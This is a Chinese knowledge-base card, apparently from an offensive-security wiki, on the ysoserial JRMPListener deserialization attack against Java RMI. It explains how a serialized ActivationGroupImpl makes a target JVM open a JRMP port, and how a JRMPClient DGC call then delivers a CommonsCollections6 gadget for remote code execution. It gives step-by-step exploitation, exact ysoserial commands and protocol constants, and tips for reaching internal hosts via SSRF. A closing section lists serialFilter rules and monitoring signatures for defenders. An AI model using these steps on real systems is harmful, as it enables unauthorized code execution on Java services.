---
id: web-java-rmi-yso-jrmp-listener-payload-reexport-port
title: ysoserial payload JRMPListener：反序列化目标 reexport 自开 JRMP 端口，再用 JRMPClient 反打触发 DGC 反序列化
type: scenario
domain: web
path: web/java/rmi
technique: yso-jrmp-listener-payload-reexport
tags:
- java
- rmi
- jrmp
- deserialization
- reexport
- dgc
- ysoserial
- gadget
- port-listen
- unauthenticated
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V520
  verified_at: '2026-11-11T13:20:15+08:00'
  notes: 已对照原文及全部35张截图核对：payload JRMPListener 本质为 sun.rmi.server.ActivationGroupImpl 序列化流（图15 base64 流以 rO0ABXNyACJzdW4ucm1p... 开头），调试中 this=ActivationGroupImpl@892、port=8888（图18）；UnicastRemoteObject.readObject→reexport（图16/17）→exportObject(new UnicastServerRef(port))（图18/19）→synchronized listen()/exportCount++（图20）→AcceptLoop 线程 TCP Accept-8888 daemon=true（图21）；DGCImpl_Stub.dirty 以 opnum=1、hash -669196253586618813L 调 newCall（图32），DGCImpl_Skel.dispatch 校验 hash 后 case 1 对 ObjID[]/long/Lease 原生 readObject（图22/13），CC6 HashSet 弹计算器（图23/25）；exploit/JRMPClient 127.0.0.1 8888 CommonsCollections6 calc 与原文命令一致（图24）。方向区分（payload 自开端口 vs payload JRMPClient 回连、exploit/JRMPListener 攻击者监听）与既有三卡核对均不同链，dedup 全部 related，非重复。卡片对 JRMP 头 Magic/Version/SingleOpProtocol、hash 不匹配抛 SkeletonMismatchException 的描述与截图一致。原文未给受影响版本，affected_versions 空合理。未验证点：未在本机复跑 yso payload 链。
url: /docs/web/java/rmi/web-java-rmi-yso-jrmp-listener-payload-reexport-port/
draft: false
kb_aliases:
- JRMPListener payload
- sun.rmi.server.ActivationGroupImpl
- UnicastRemoteObject reexport
- 反序列化自开端口
- ysoserial JRMPListener base64
- JRMPClient exploit 反打
- DGC dirty 反序列化
---

## 一句话结论

与“攻击者自己起 JRMPListener 等目标来连”相反，ysoserial 的 `payloads/JRMPListener` 生成一个序列化的 `UnicastRemoteObject` 子类对象（`sun.rmi.server.ActivationGroupImpl`，port 被设为指定值）；把它投递进目标的反序列化入口后，目标 `readObject` 时会执行 `reexport()` → `UnicastRemoteObject.exportObject` → `UnicastServerRef.listen()`，在自己的进程里开启一个 JRMP 监听端口；随后攻击者用 `ysoserial.exploit.JRMPClient <target> <port> <gadget>` 向该端口发起 DGC `dirty` 调用，目标 `DGCImpl_Skel.dispatch` 对请求参数做原生 `readObject`，gadget 执行即 RCE。

## 原理

- **payload 本体**：`java -jar ysoserial-all.jar JRMPListener <port> | base64` 生成的是 `sun.rmi.server.ActivationGroupImpl`（继承 `UnicastRemoteObject`）的序列化流；yso 在生成时把对象的 `port` 字段设为命令行指定端口（原文调试中 `this` 为 `ActivationGroupImpl@892`、`port=8888`）。
- **反序列化即监听**：`UnicastRemoteObject` 实现自定义 `readObject`，恢复引用后会调用 `reexport()`：
  ```java
  private void reexport() throws RemoteException {
      if (csf == null && ssf == null || permitExport) {
          exportObject(this, port);
      }
  }
  ```
  `UnicastRemoteObject.exportObject(Remote, int)` 用 `new UnicastServerRef(port)` 包装对象，`UnicastServerRef.exportObject(Target)` 在 `synchronized` 块里调用 `listen()` 并 `exportCount++`，随后启动守护线程 `AcceptLoop`（线程名 `TCP Accept-<port>`），端口开始接受连接。
- **DGC 反打**：监听建立后，攻击者端 `ysoserial.exploit.JRMPClient` 按 JRMP/DGC 协议发送 `DGCImpl.dirty` 调用——`DGCImpl_Stub.dirty` 使用 `opnum=1`、接口 hash `-669196253586618813L`，序列化 `ObjID[]`、`sequenceNum`、`Lease` 作为参数。目标侧的 `DGCImpl_Skel.dispatch` 先用 `var2.getInputStream()` 读参数，并在 `case 1` 中对参数做 `readObject()`——攻击者把 CommonsCollections 等 gadget 塞进参数，即在目标 JVM 完成反序列化 RCE（原文以 `CommonsCollections6` 弹计算器验证）。
- **与 JRMPClient payload 的区别**：`payloads/JRMPClient` 是“让目标主动回连攻击者的 JRMPListener”；本卡是“让目标自己开监听、攻击者主动连目标”。两者方向相反，都是把不可出网/单向可达场景转化为反序列化执行。
- **为什么有价值**：目标可能位于内网、只能被攻击者单向访问（或存在 SSRF），此时“让目标开端口”比“让目标出网回连”更容易命中；且监听端口由 payload 指定，攻击者可挑一个防火墙允许的端口。

## 触发条件

- 目标存在可投递任意序列化数据的反序列化入口（`ObjectInputStream.readObject`、RMI 反序列化点等）。
- 目标 JVM 允许 RMI 对象 reexport：未通过 `jdk.serialFilter`/JEP290 全局过滤器拦截 `sun.rmi.**` 相关类，且进程有创建监听端口的权限。
- 攻击者能访问目标新开的端口（内网直连或经 SSRF/代理）。
- 目标进程不退出（监听线程为 daemon，主线程结束则失效；原文 Demo 用 `while(true) Thread.sleep(3000)` 保持进程存活）。

## 利用步骤

1. 生成 payload：`java -jar ysoserial-all.jar JRMPListener 8888 | base64`；或直接写入文件 `> 1.txt`。
2. 通过反序列化入口投递该 base64（原文 Demo 用 `SerializeUtils.base64deserial(...)` 模拟反序列化入口）。
3. 目标反序列化后自动 reexport，在 8888 端口监听；可在目标侧确认新出现的 `TCP Accept-8888` 线程与端口。
4. 攻击者执行 `java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient <target-ip> 8888 CommonsCollections6 calc`，触发目标 `DGCImpl_Skel` 反序列化，命令执行。
5. 清理/复测：目标端口关闭或进程重启后监听消失，属一次性内存态利用。

## PoC

生成 payload（原文命令）：

```bash
java -jar ysoserial-all.jar JRMPListener 8888 | base64
# 或
java -jar ysoserial-all.jar JRMPListener 8888 > 1.txt
```

投递到反序列化入口（原文 Demo 的反序列化调用形式）：

```java
// 任意 readObject 入口均可；原文用 base64 解码后反序列化演示
SerializeUtils.base64deserial("<JRMPListener base64>");
while (true) { Thread.sleep(3000); } // 仅 Demo 用于保持进程
```

反打（原文命令）：

```bash
java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 8888 CommonsCollections6 calc
```

原文截图中可见目标端调用栈为 `DGCImpl_Skel.dispatch → ObjectInputStream.readObject → HashSet.readObject → ...`（`opnum=1`、hash `-669196253586618813`），计算器弹出，验证反序列化成功。

## 变体与关联

- **方向相反的既有卡**：[[web-java-rmi-jrmp-listener-fake-registry-scanner-counterattack]]（exploit/JRMPListener 由攻击者侧监听，冒充注册中心反制扫描器/客户端）、[[web-java-rmi-jrmp-exceptional-return-jndi-jdk21-bypass]]（恶意 listener 返回 `ExceptionalReturn` 触发客户端 `readObject`）、[[web-java-deser-jrmpclient-unicastref-jackson1]]（payload JRMPClient 让目标回连）。
- **协议细节**：JRMP 传输头为 `Magic`（0x4a524d49）、`Version`（0x0002）、`SingleOpProtocol`，业务 op 为 `TransportConstants.Call`；`DGCImpl_Stub.dirty` 的 `opnum=1`、hash `-669196253586618813L` 是固定值，二者不匹配会抛 `SkeletonMismatchException`。
- **组合用法**：先通过 SSRF/盲反序列化让内网目标开端口，再用 JRMPClient 打回；也可在目标端 JDK 8u191+ 禁用 codebase 时作为替代通道。

## 检测与防御

- **反序列化过滤**：配置 `jdk.serialFilter` 拒绝 `sun.rmi.**`、`java.rmi.server.*`、`sun.rmi.server.ActivationGroupImpl`、`UnicastRef`/`LiveRef` 等 RMI 相关类（或采用类白名单），及时升级 JEP290 相关补丁。
- **端口/进程监控**：进程在运行期新增监听端口、线程名出现 `TCP Accept-<port>`、`UnicastServerRef.exportObject`/`listen` 调用，均属异常；EDR 对 `reexport`、`AcceptLoop` 线程创建告警。
- **网络检测**：内网主机对目标非常规端口发起 JRMP 协议连接（Magic/Version 特征）、DGC `dirty` 调用（opnum=1、hash 固定值）应告警。
- **入口治理**：修复反序列化入口（禁用危险 `readObject`、启用全局过滤器），限制内网横向访问与端口可达性。
